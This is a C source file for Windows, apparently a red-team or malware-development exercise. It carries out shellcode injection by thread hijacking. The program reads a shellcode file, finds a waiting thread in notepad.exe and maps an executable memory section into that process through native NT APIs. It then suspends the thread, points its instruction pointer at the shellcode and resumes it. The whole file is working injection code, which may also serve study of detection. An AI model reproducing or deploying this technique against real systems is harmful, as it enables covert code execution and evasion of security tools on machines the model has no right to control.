#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <stdio.h>
#include "main.h"





/*----------------------------------------
  Initialize struct to hold the addresses
  of all APIs that will be used.
----------------------------------------*/
BOOL InitNTAPI(PNTAPIS NtAPIs) {

	printf("[*] Initializing NTAPI struct.\n");
	HMODULE hModule = GetModuleHandleW(L"NTDLL");
	if (hModule == NULL) {
		printf("[!] Could not get a handle to ntdll.dll\n");
		return FALSE;
	}

	NtAPIs->pNtSetContextThread = (fnNtSetContextThread)GetProcAddress(hModule, "NtSetContextThread");
	NtAPIs->pNtGetContextThread = (fnNtGetContextThread)GetProcAddress(hModule, "NtGetContextThread");
	NtAPIs->pNtOpenThread = (fnNtOpenThread)GetProcAddress(hModule, "NtOpenThread");
	NtAPIs->pNtOpenProcess = (fnNtOpenProcess)GetProcAddress(hModule, "NtOpenProcess");
	NtAPIs->pNtCreateSection = (fnNtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	NtAPIs->pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	NtAPIs->pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
	NtAPIs->pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
	NtAPIs->pNtSuspendThread = (fnNtSuspendThread)GetProcAddress(hModule, "NtSuspendThread");
	NtAPIs->pNtResumeThread = (fnNtResumeThread)GetProcAddress(hModule, "NtResumeThread");
	NtAPIs->pNtClose = (fnNtClose)GetProcAddress(hModule, "NtClose");
	NtAPIs->pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hModule, "NtWriteVirtualMemory");
	return TRUE;
}


/*----------------------------------------
 Prepare some memory for the shellcode
 trough remote mapping
----------------------------------------*/
BOOL prepareMem(NTAPIS NtAPIs, HIJACK hjack, PBYTE sc, SIZE_T sc_size, PVOID* rAddr, PVOID* lAddr) {

	HANDLE hProcess = NULL,
		hSection = NULL;
	NTSTATUS status = NULL;
	OBJECT_ATTRIBUTES oAttr = { 0 };
	CLIENT_ID cid = {
		.UniqueProcess = (HANDLE)hjack.PID,
		.UniqueThread = (HANDLE)0
	};
	LARGE_INTEGER scSize = { 0 };
	scSize.HighPart = 0;
	scSize.LowPart = (SIZE_T)sc_size;

	InitializeObjectAttributes(&oAttr, NULL, 0, NULL, NULL);


	printf("[*] Opening process: %d\n", hjack.PID);
	status = NtAPIs.pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oAttr, &cid);
	if (status != 0x00) {
		printf("[!] Failed opening proess: 0x%X\n", status);
		return FALSE;
	}

	printf("[*] Creating a memory section\n");
	status = NtAPIs.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &scSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (status != 0x00) {
		printf("[!] Failed creating a mem section: 0x%X\n", status);
		goto _Cleanup;
	}

	printf("[*] Section handle: 0x%X\n", hSection);

	printf("[*] Mapping the section to the local process\n");
	SIZE_T sViewSize = 0;
	status = NtAPIs.pNtMapViewOfSection(hSection, (HANDLE)-1, lAddr, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
	if (status != 0x00) {
		printf("[!] Failed mapping the section to local: 0x%X\n", status);
		goto _Cleanup;
	}
	printf("[*] Local Address: 0x%p\n", *lAddr);
	
	printf("[*] Mapping the section to the remote process\n");
	status = NtAPIs.pNtMapViewOfSection(hSection, hProcess, rAddr, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	if (status != 0x00) {
		printf("[!] Remote mapping failed: 0x%X\n", status);
		goto _Cleanup;
	}
	printf("[*] Remote address: 0x%p\n", *rAddr);
	return TRUE;
	

_Cleanup:
	if (hProcess != NULL) {
		NtAPIs.pNtClose(hProcess);
	}
	if (hSection != NULL) {
		NtAPIs.pNtClose(hSection);
	}
	return FALSE;
}


/*------------------------------------
  Simple function to perform the 
  thread hijacking
------------------------------------*/
BOOL HjThread(NTAPIS NtAPIs, HIJACK hjack, PVOID addr) {
	
	NTSTATUS status = NULL;
	HANDLE hThread = NULL;
	CONTEXT tctx = {
		.ContextFlags = CONTEXT_ALL
	};
	OBJECT_ATTRIBUTES oAttr = { 0 };
	CLIENT_ID cid = {
		.UniqueProcess = (HANDLE)hjack.PID,
		.UniqueThread = (HANDLE)hjack.TID
	};

	InitializeObjectAttributes(&oAttr, NULL, 0, NULL, NULL);


	printf("[*] Trying to get a handle on Thread: %d for Process: %d\n", hjack.TID, hjack.PID);

	status = NtAPIs.pNtOpenThread(&hThread, THREAD_ALL_ACCESS, &oAttr, &cid);
	if (status != 0x00) {
		printf("[!] Could not get a handle to PID: %d, TID: %d with error: 0x%X\n", hjack.PID, hjack.TID, status);
		return FALSE;
	}

	printf("[*] Suspending thread and updating context.\n");
	status = NtAPIs.pNtSuspendThread(hThread, NULL);
	if (status != 0x00) {
		printf("[!] Suspending thread failed: 0x%X\n", status);
		goto _Cleanup;
	}

	printf("[*] Getting the existing thread context\n");
	status = NtAPIs.pNtGetContextThread(hThread, &tctx);
	if (status != 0x00) {
		printf("[!] Could not get existing thread context: 0x%X\n", status);
		goto _Cleanup;
	}

	printf("[*] Updating the RIP of the thread with the new exec address\n");
	//Update RIP to point to the shellcode address
	tctx.Rip = addr;

	printf("[*] Updating the context of the thread\n");
	status = NtAPIs.pNtSetContextThread(hThread, &tctx);
	if (status != 0x00) {
		printf("[!] Updating thread context failed: 0x%X\n", status);
		goto _Cleanup;
	}

	printf("[*] Resumming thread\n");
	status = NtAPIs.pNtResumeThread(hThread, NULL);
	if (status != 0x00) {
		printf("[!] Could not resumme thread\n");
		goto _Cleanup;
	}
	return TRUE;


_Cleanup:
	NtAPIs.pNtClose(hThread);
	return FALSE;
}


/*------------------------------------------------
  Temp function to read the shellcode from a file
------------------------------------------------*/
BOOL ReadF(const char* file_path, long* file_size, char** read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		printf("Error opening file: %s", file_path);
		*file_size = 0;
		return FALSE;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size * sizeof(char));
	if (*read_buffer == NULL) {
		printf("Memory allocation failed");
		fclose(file);
		return FALSE;
	}

	fread(*read_buffer, 1, *file_size, file);
	fclose(file);
	return TRUE;
}



/*------------------------------------------
	Enumerate threads on a remote process
	with the same session ID and attempt to
	hijack one of them. Additionaly checks 
	if the choosen process is safe to be 
	used
------------------------------------------*/
BOOL IsCritical(NTAPIS NtAPIs, DWORD pid) {

	HANDLE hProcess = NULL;
	NTSTATUS status = NULL;
	ULONG isCritical = NULL;
	OBJECT_ATTRIBUTES oAttr = { 0 };
	CLIENT_ID cid = {
		.UniqueProcess = (HANDLE)pid,
		.UniqueThread = (HANDLE)0
	};


	status = NtAPIs.pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oAttr, &cid);
	if (status != 0x00) {
		printf("[!] Failed opening proess: 0x%X\n", status);
		return FALSE;
	}

	status = NtAPIs.pNtQueryInformationProcess(hProcess, ProcessBreakOnTermination, &isCritical, sizeof(ULONG), NULL);
	if (status != 0x00) {
		printf("[!] Querying process failed: 0x%X\n", status);
		NtAPIs.pNtClose(hProcess);
		return FALSE;
	}
	NtAPIs.pNtClose(hProcess);
	
	if (isCritical != 0) {
		printf("[!] Process is critical, not using it..\n");
		return TRUE;
	}
	else {
		printf("[*] Process can be used.\n");
		return FALSE;
	}
}

ULONG GetSessionID(NTAPIS NtAPIs) {

	PROCESS_SESSION_INFORMATION sessInfo = { 0 };
	NTSTATUS status = NULL;
	
	printf("[*] Getting current process session ID.\n");
	status = NtAPIs.pNtQueryInformationProcess((HANDLE)-1, ProcessSessionInformation, &sessInfo, sizeof(PROCESS_SESSION_INFORMATION), NULL);
	if (status != 0x00) {
		printf("[!] Query process failed: 0x%X\n", status);
		return 0;
	}
	printf("[*] Found SessionID: %ld\n", sessInfo.SessionId);
	return sessInfo.SessionId;
}



BOOL EnumThreads(NTAPIS NtAPIs, LPWSTR procName, PHIJACK hijack) {

	ULONG returnLen1 = NULL,
		returnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
	PSYSTEM_THREAD_INFORMATION pThreadInfo = NULL;
	NTSTATUS status = NULL;

	printf("[*] Getting process array len\n");
	status = NtAPIs.pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &returnLen1);

	pProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLen1);
	if (!pProcInfo) {
		printf("[!] Heap allocation failed\n");
		return NULL;
	}

	PVOID toFree = pProcInfo;

	printf("[*] Getting processes\n");
	status = NtAPIs.pNtQuerySystemInformation(SystemProcessInformation, pProcInfo, returnLen1, &returnLen2);
	if (status != 0x00) {
		printf("[!] Query failed: 0x%X\n", status);
		goto _Cleanup;
	}

	ULONG CurrentSession = GetSessionID(NtAPIs);

	while (TRUE) {
		
		if (
			pProcInfo->ImageName.Length 
			&& wcscmp(pProcInfo->ImageName.Buffer, procName) == 0
			&& pProcInfo->SessionId == CurrentSession
			) {

			printf("[*] Found target process: %ws, PID: %ld, SessionID: %lu\n", pProcInfo->ImageName.Buffer, pProcInfo->UniqueProcessId, pProcInfo->SessionId);
			
			if (IsCritical(NtAPIs, (DWORD)pProcInfo->UniqueProcessId)) {
				goto _Cleanup;
			}

			pThreadInfo = (PSYSTEM_THREAD_INFORMATION)pProcInfo->Threads;

			if (pProcInfo->NumberOfThreads > 1) {
				//Skip element 0, as most of the times this is the main thread of the process
				for (DWORD i = 1; i < pProcInfo->NumberOfThreads; i++) {
					printf("[+] Thread [ %d ] \n", i);
					printf("\t> Thread Id: %d \n", pThreadInfo[i].ClientId.UniqueThread);
					printf("\t> Thread's Start Address: 0x%p\n", pThreadInfo[i].StartAddress);
					printf("\t> Thread Priority: %d\n", pThreadInfo[i].Priority);
					printf("\t> Thread State: %d\n", pThreadInfo[i].ThreadState);
					printf("\t> Wait state: %d\n", pThreadInfo[i].WaitReason);
					if (pThreadInfo[i].ThreadState == Waiting) {
						hijack->PID = (DWORD)pProcInfo->UniqueProcessId;
						hijack->TID = (DWORD)pThreadInfo[i].ClientId.UniqueThread;
					}
				}
				break;
			}
			else {
				printf("[!] Target process have only 1 thread aborting...\n");
				goto _Cleanup;
			}
		}
		if (!pProcInfo->NextEntryOffset) {
			break;
		}

		pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pProcInfo + pProcInfo->NextEntryOffset);
	}
	return TRUE;


_Cleanup:
	HeapFree(GetProcessHeap(), 0, toFree);
	return FALSE;
}


NTAPIS NtAPIs = { 0 };

/*-----------------
  Main function
-----------------*/
int main()
{
	
	PWSTR proc = L"notepad.exe";
	HIJACK hjack = { 0 };
	PVOID remoteAddr = NULL;
	PVOID localAddr = NULL;
	long sc_size;
	char* sc;

	if (!ReadF("C:\\Users\\nullb1t3\\Desktop\\calc-t.bin", &sc_size, &sc)) {
		printf("[!] Could not read the shellcode\n");
		return 1;
	}

	if (!InitNTAPI(&NtAPIs)) {
		printf("[!] Could not initialize NTAPIs struct\n");
		return 1;
	}

	if (!EnumThreads(NtAPIs, proc, &hjack)) {
		printf("[!] Could not find suitable thread to hijack for process: %ws\n", proc);
		return 1;
	}

	printf("[*] Targeting\n\t> PID: %d\n\t> TID: %d\n", hjack.PID, hjack.TID);


	if (!prepareMem(NtAPIs, hjack, sc, sc_size, &remoteAddr, &localAddr)) {
		printf("[!] Failed preparing memory for the shellcode\n");
		return 1;
	}

	printf("[*] Writing to local section\n");
	mymemcpy(localAddr, sc, sc_size);

	if (!HjThread(NtAPIs, hjack, remoteAddr)) {
		printf("[!] Failed hijacking thread\n");
		return 1;
	}

	return 0;
}
